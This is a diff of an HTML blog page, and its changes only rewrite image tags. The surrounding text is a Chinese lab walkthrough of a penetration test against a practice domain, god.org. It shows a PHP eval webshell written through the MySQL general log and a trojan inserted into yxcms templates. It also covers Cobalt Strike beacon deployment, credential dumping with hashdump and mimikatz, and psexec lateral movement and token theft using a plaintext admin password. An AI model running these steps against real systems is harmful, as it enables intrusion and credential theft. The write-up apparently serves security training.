@@ -31,7 +31,7 @@
 <p>进入win7 启动phpstudy。</p>
 <p><img src="http://image.v0w.top/Blog/20200719135927.png"></p>
 <p>发现三台主机都是固定IP的，是在<code>192.168.52.0/24段</code>可以通过三台主机之前进行ping测试，测试能通后，可以正式开始练习了。如果遇到NAT（比如主机和同网段的kali）ping不通win7的情况，试着关闭防火墙再试试。</p>
-<img src="http://image.v0w.top/Blog/20200719140851.png" style="zoom: 80%;" />
+<img src="http://image.v0w.top/Blog/20200719140851.png" style="zoom: 80%;">
 
 
 
@@ -43,11 +43,11 @@
 <p>或者直接使用nmap扫描同一C段：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.237.0&#x2F;24		# -sP ping方式探测存活主机</span><br></pre></td></tr></table></figure>
 
-<img src="http://image.v0w.top/Blog/20200719152431.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719152431.png" style="zoom:80%;">
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -Pn -p 1-65535 192.168.237.136	# -sC默认脚本 -sV 服务版本 -p指定端口</span><br></pre></td></tr></table></figure>
 
-<img src="http://image.v0w.top/Blog/20200719153434.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719153434.png" style="zoom:80%;">
 
 
 
@@ -60,14 +60,14 @@
 </ol>
 <p>测试发现使用的版本恰好没有后门文件可以利用。尝试第二种方式，测试MySQL外连和登录密码。这里出题比较简单，直接是弱口令，<code>root/root</code>就可以连进去，而且是可以外连的。</p>
 <p>使用dirmap或者御剑扫描web目录，发现<code>phpmyAdmin</code>和<code>beifen.rar</code>（如果是没有弱口令，从备份文件中找配置也是一个突破口）</p>
-<img src="http://image.v0w.top/Blog/20200719160240.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719160240.png" style="zoom:80%;">
 
 <p>备份文件是一个yxcms的源码：</p>
-<img src="http://image.v0w.top/Blog/20200719162406.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719162406.png" style="zoom:80%;">
 
 <p>在全文搜索admin之后，发现后台默认的用户名和密码：<code>admin/123456</code></p>
 <p>发现后台地址：<code>/index.php?r=admin</code></p>
-<img src="http://image.v0w.top/Blog/20200719163239.png" style="zoom:50%;" />
+<img src="http://image.v0w.top/Blog/20200719163239.png" style="zoom:50%;">
 
 
 
@@ -80,7 +80,7 @@
 <h3 id="3-2-1-mysql日志写shell"><a href="#3-2-1-mysql日志写shell" class="headerlink" title="3.2.1 mysql日志写shell"></a>3.2.1 mysql日志写shell</h3><p>先看一下有没有写权限：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure>
 
-<img src="http://image.v0w.top/Blog/20200719164102.png" style="zoom:50%;" />
+<img src="http://image.v0w.top/Blog/20200719164102.png" style="zoom:50%;">
 
 <p><code>secure_file_priv ==&#39;&#39;</code>为空说明有任意目录的写权限，非空则只能在对应目录读文件，这里的非空包括<code>NULL</code>。所以这里没有写权限，无法直接写shell。</p>
 <p>因为在mysql 5.6.34版本以后 <code>secure_file_priv</code>的值默认为<code>NULL</code>。并且无法用sql语句对其进行修改，只能够通过以下方式修改</p>
@@ -92,37 +92,37 @@
 <p>这里无法直接写shell，那我们来尝试日志写 <code>shell</code>，开启日志记录</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;; 	# 开启日志记录</span><br><span class="line">show variables like &#39;general%&#39;; # 查看当前的日志记录</span><br><span class="line">set global general_log_file&#x3D;&quot;C:&#x2F;&#x2F;phpStudy&#x2F;www&#x2F;v0w.php&quot;;  # 指定日志文件</span><br></pre></td></tr></table></figure>
 
-<img src="http://image.v0w.top/Blog/20200719170708.png" style="zoom:50%;" />
+<img src="http://image.v0w.top/Blog/20200719170708.png" style="zoom:50%;">
 
-<img src="http://image.v0w.top/Blog/20200719171124.png" style="zoom:50%;" />
+<img src="http://image.v0w.top/Blog/20200719171124.png" style="zoom:50%;">
 
 <p>进行一次查询，查询记录就将写到日志文件中，形成一个webshell。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &#39;&lt;?php eval($_POST[&quot;v0w&quot;]);?&gt;&#39;</span><br></pre></td></tr></table></figure>
 
-<img src="http://image.v0w.top/Blog/20200719171314.png" style="zoom:50%;" />
+<img src="http://image.v0w.top/Blog/20200719171314.png" style="zoom:50%;">
 
 <p>使用蚁剑连接，getshell。</p>
-<img src="http://image.v0w.top/Blog/20200719171508.png" style="zoom: 80%;" />
+<img src="http://image.v0w.top/Blog/20200719171508.png" style="zoom: 80%;">
 
 <h3 id="3-2-2-通过yxcms-getshell"><a href="#3-2-2-通过yxcms-getshell" class="headerlink" title="3.2.2 通过yxcms getshell"></a>3.2.2 通过yxcms getshell</h3><p>利用之前得到的一些信息，登录后台</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后台地址：&#x2F;index.php?r&#x3D;admin</span><br><span class="line">用户名和密码：admin  123456</span><br></pre></td></tr></table></figure>
 
 <p>看看有没有上传或者什么可以写入shell的地方。可以通过Seay审计工具来进行比较细致的审计 ，不过我们不用工具，也容易找到前台模板的管理页面存在编辑功能，明显的写shell的地方。</p>
 <p>比如随便找一个模板进行修改，插入一句话木马（虽然是随便找的，但是需要知道，这个模板在哪个网页执行）</p>
-<img src="http://image.v0w.top/Blog/20200719173829.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719173829.png" style="zoom:80%;">
 
 <p>这个很明显就在<code>index.php</code>处的搜索功能。</p>
 <p>比如我们随便搜索一个关键词，就会触发这个shell。再或者通过下载下来的备份文件搜索这个文件，直接访问到这个文件的路径也可以拿下shell。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.237.136&#x2F;yxcms&#x2F;index.php?r&#x3D;default%2Findex%2Fsearch&amp;keywords&#x3D;q&amp;type&#x3D;all</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.237.136&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;index_search.php</span><br></pre></td></tr></table></figure>
 
-<img src="http://image.v0w.top/Blog/20200719175223.png" style="zoom: 50%;" />
+<img src="http://image.v0w.top/Blog/20200719175223.png" style="zoom: 50%;">
 
 
 
 <h1 id="0x04-内网渗透"><a href="#0x04-内网渗透" class="headerlink" title="0x04 内网渗透"></a>0x04 内网渗透</h1><h2 id="4-1-将web服务器上线到CS"><a href="#4-1-将web服务器上线到CS" class="headerlink" title="4.1 将web服务器上线到CS"></a>4.1 将web服务器上线到CS</h2><p>将刚才生成的<code>beacon.exe</code>上传到web目录，然后在shell中执行这个exe,就可以将shell上线到CS了。</p>
-<img src="http://image.v0w.top/Blog/20200719192123.png" style="zoom:50%;" />
+<img src="http://image.v0w.top/Blog/20200719192123.png" style="zoom:50%;">
 
-<img src="http://image.v0w.top/Blog/20200719193327.png" style="zoom:50%;" />
+<img src="http://image.v0w.top/Blog/20200719193327.png" style="zoom:50%;">
 
 
 
@@ -131,28 +131,28 @@
 <p>进入 <code>beacon</code> 执行 <code>sleep 0</code>，然后查看下基本的本机信息：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">hostname</span><br><span class="line">net user</span><br><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>
 
-<img src="http://image.v0w.top/Blog/20200719194054.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719194054.png" style="zoom:80%;">
 
 <p><code>systeminfo</code> 可以查看系统详细信息，提供两个小 <code>tips</code>:</p>
 <p>查看是什么操作系统 &amp; 系统版本：<br>系统中文：<code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code><br>系统英文：<code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code><br>查询系统体系架构：echo % PROCESSOR_ARCHITECTURE%</p>
-<img src="http://image.v0w.top/Blog/20200719195546.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719195546.png" style="zoom:80%;">
 
 <p>查询已安装的软件及版本信息：<code>wmic product get name,version</code></p>
-<img src="http://image.v0w.top/Blog/20200719195654.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719195654.png" style="zoom:80%;">
 
 <p>在 <code>win10</code> 中，输入 <code>wmic /?</code> 会提示 <code>wmic</code> 已弃用，但在 <code>server2012R2</code>，<code>win7</code> 等版本中可以正常使用</p>
 <p><code>powershell</code> 中可替代该命令的是 <code>Get-WmiObject</code>:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -class win32_product | Select-Object -property name,version</span><br></pre></td></tr></table></figure>
 
 <p>查询进程及服务：<br><code>tasklist</code>，默认显示映像名称，PID，会话名，会话，内存使用</p>
-<img src="http://image.v0w.top/Blog/20200719195906.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719195906.png" style="zoom:80%;">
 
 <p><code>tasklist /svc</code>，默认显示映像名称，PID，服务</p>
-<img src="http://image.v0w.top/Blog/20200719195927.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719195927.png" style="zoom:80%;">
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure>
 
-<img src="http://image.v0w.top/Blog/20200719200121.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719200121.png" style="zoom:80%;">
 
 <p>常见的杀软进程：</p>
 <table>
@@ -210,12 +210,12 @@
 <h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>使用 <code>ipconfig /all</code> 查看 <code>DNS</code> 服务器：</p>
 <p><img src="http://image.v0w.top/Blog/20200719200858.png"></p>
 <p>发现 DNS 服务器名为 <code>god.org</code>，查看域信息：<code>net view</code></p>
-<img src="http://image.v0w.top/Blog/20200719201026.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719201026.png" style="zoom:80%;">
 
 <p>查看主域信息：<code>net view /domain</code></p>
 <p><img src="http://image.v0w.top/Blog/20200719201134.png"></p>
 <p>查看时间服务器：<code>net time /domain</code></p>
-<img src="http://image.v0w.top/Blog/20200719201254.png"  />
+<img src="http://image.v0w.top/Blog/20200719201254.png">
 
 <p>发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但该用户不是域用户)</p>
 <p>查询当前的登录域与用户信息：<code>net config workstation</code></p>
@@ -229,7 +229,7 @@
 <p><img src="http://image.v0w.top/Blog/20200719202425.png"></p>
 <p>获取域内用户的详细信息：<code>wmic useraccount get /all</code></p>
 <p>可以获取到用户名，描述信息，SID 域名等：</p>
-<img src="http://image.v0w.top/Blog/20200719202526.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719202526.png" style="zoom:80%;">
 
 <p>查看所有域成员计算机列表：<code>net group &quot;domain computers&quot; /domain</code></p>
 <p><img src="http://image.v0w.top/Blog/20200719202617.png"></p>
@@ -243,16 +243,16 @@
 <h2 id="4-4-横向探测"><a href="#4-4-横向探测" class="headerlink" title="4.4 横向探测"></a>4.4 横向探测</h2><p>获取到一个 <code>cs</code> 的 <code>beacon</code> 后可以继续查看目标内网情况和端口开放情况</p>
 <p>在 <code>beacon</code> 上右键 -&gt; 目标 -&gt; 选择 <code>net view</code> 或者 <code>port scan（端口扫描）</code>:</p>
 <p><strong>net view</strong></p>
-<img src="http://image.v0w.top/Blog/20200719203320.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719203320.png" style="zoom:80%;">
 
 <p>执行之后，可以在<code>CobaltStrike-&gt;可视化-&gt;目标列表</code>看到扫描出来的主机：</p>
 <p><img src="http://image.v0w.top/Blog/20200719203856.png"></p>
 <p>用 <code>cs</code> 的 <code>hashdump</code> 读内存密码：<code>hashdump</code>，</p>
 <p>用 <code>mimikatz</code> 读注册表密码：<code>logonpasswords</code></p>
-<img src="http://image.v0w.top/Blog/20200719204025.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719204025.png" style="zoom:80%;">
 
 <p>在凭证信息一栏可以清楚查看：</p>
-<img src="http://image.v0w.top/Blog/20200719204108.png" style="zoom: 80%;" />
+<img src="http://image.v0w.top/Blog/20200719204108.png" style="zoom: 80%;">
 
 <p>如果权限不够可以提权，自带部分提权POC</p>
 <p><img src="http://image.v0w.top/Blog/20200719205029.png"></p>
@@ -273,7 +273,7 @@
 <p><img src="http://image.v0w.top/Blog/20200719212518.png"></p>
 <p>之后就可以愉快的使用了。</p>
 <p>查看帮助：</p>
-<img src="http://image.v0w.top/Blog/20200719212548.png" style="zoom: 80%;" />
+<img src="http://image.v0w.top/Blog/20200719212548.png" style="zoom: 80%;">
 
 <p>扫描网段内存活主机信息：<code>Ladon 192.168.72.0/24 OsScan</code></p>
 <p>域探测差不多了还可以使用 <a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound"><code>BloodHound</code></a>这款域渗透分析工具来分析攻击路径</p>
@@ -290,10 +290,10 @@
 <p>新建一个 <code>Listener</code>，<code>payload</code> 设置为 <code>Beacon SMB</code>：</p>
 <p><img src="http://image.v0w.top/Blog/20200719221248.png"></p>
 <p>在已有的 <code>Beacon上</code>右键 <code>Spawn</code>(生成会话 / 派生)，选择创建的 <code>smb beacon</code> 的 <code>listerner</code>:</p>
-<img src="http://image.v0w.top/Blog/20200719220636.png" style="zoom: 80%;" />
+<img src="http://image.v0w.top/Blog/20200719220636.png" style="zoom: 80%;">
 
 <p>选择后会反弹一个子会话，在 <code>external</code> 的 <code>ip</code> 后面会有一个链接的小图标：</p>
-<img src="http://image.v0w.top/Blog/20200719220734.png" style="zoom:80%;" />
+<img src="http://image.v0w.top/Blog/20200719220734.png" style="zoom:80%;">
 
 
 
@@ -306,12 +306,12 @@
 <h3 id="psexec-使用凭证登录其他主机"><a href="#psexec-使用凭证登录其他主机" class="headerlink" title="psexec 使用凭证登录其他主机"></a>psexec 使用凭证登录其他主机</h3><p>前面横向探测已经获取到内网内的其他 <code>Targets</code> 以及读取到的凭证信息</p>
 <p>于是可以尝试使用 <code>psexec</code> 模块登录其他主机</p>
 <p>右键选择一台非域控主机 <code>ROOT-TVI862UBEH</code> 的 <code>psexec</code> 模块：</p>
-<img src="http://image.v0w.top/Blog/20200719223832.png" style="zoom: 67%;" />
+<img src="http://image.v0w.top/Blog/20200719223832.png" style="zoom: 67%;">
 
 <p>在弹出的窗口中选择使用 <code>god.org</code> 的 <code>Administrator</code> 的凭证信息</p>
 <p>监听器选择刚才创建的 <code>smb beacon</code>，会话也选择对应的 <code>smb beacon</code> 的会话：</p>
 <p><img src="http://image.v0w.top/Blog/20200719224006.png"></p>
-<img src="http://image.v0w.top/Blog/20200719224034.png" style="zoom:67%;" />
+<img src="http://image.v0w.top/Blog/20200719224034.png" style="zoom:67%;">
 
 <p>可以看到分别执行了</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">[*] Tasked beacon to revert token</span><br><span class="line">beacon&gt; make_token GOD.ORG\Administrator V0Wldl19980114</span><br><span class="line">[*] Tasked beacon to create a token for GOD.ORG\Administrator</span><br><span class="line">beacon&gt; jump psexec ROOT-TVI862UBEH smb</span><br></pre></td></tr></table></figure>
@@ -322,7 +322,7 @@
 <h3 id="token-窃取"><a href="#token-窃取" class="headerlink" title="token 窃取"></a>token 窃取</h3><p>除了直接使用获取到的 <code>hash</code> 值，也可以直接窃取 <code>GOD\Administrator</code> 的 <code>token</code> 来登录其他主机</p>
 <p>选择 <code>beacon</code> 右键 -&gt; 目标 -&gt; 进程列表</p>
 <p>选择 <code>GOD\Administrator</code> 的 <code>token</code> 盗取：</p>
-<img src="http://image.v0w.top/Blog/20200719225201.png" style="zoom: 67%;" />
+<img src="http://image.v0w.top/Blog/20200719225201.png" style="zoom: 67%;">
 
 <p>然后在选择令牌处勾选使用当前 <code>token</code> 即可：</p>
 <p><img src="http://image.v0w.top/Blog/20200719225303.png"></p>
